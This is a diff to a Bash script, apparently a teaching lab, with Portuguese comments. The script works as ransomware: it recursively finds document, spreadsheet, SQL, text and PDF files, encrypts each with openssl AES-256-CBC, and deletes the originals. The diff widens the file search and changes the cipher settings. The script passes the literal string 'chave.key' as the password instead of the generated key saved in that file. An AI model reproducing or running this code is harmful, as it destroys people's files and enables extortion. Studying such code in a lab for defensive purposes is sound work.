@@ -5,7 +5,8 @@
 #################################
 
 # local e exntesões de arquivos que serão atacadas neste lab:
-arquivos=$(ls *.txt *.tar *.gzip *.doc *.docx *.xls *.xlsx *.ppt *.pptx *.sql 2>/dev/null)
+#arquivos=$(ls *.txt *.tar *.gzip *.doc *.docx *.xls *.xlsx *.ppt *.pptx *.sql 2>/dev/null)
+arquivos=$(find $(pwd) -print | egrep ".txt|.sql|.xls|.doc|.pdf")
 
 # variavel que vai armazenar chave privada para decriptar
 chave=$(/usr/bin/dbus-uuidgen)
@@ -15,8 +16,9 @@ echo $chave > chave.key
 # vamos ler todos os arquivos da pasta desejada, exceto arquivos que vou precisar depois:
 for file in $arquivos
 do
-	# agora vamos encriptar tudo usando a chave desejada
-	openssl enc -in $file -out $file".cry" -e -md sha512 -k chave.key 
+	# agora vamos encriptar tudo usando a chave desejado
+	openssl enc -in $file -out $file".cry" -aes-256-cbc -pbkdf2 -k chave.key 
+	echo "[+] $file"
 	rm $file
 
 done
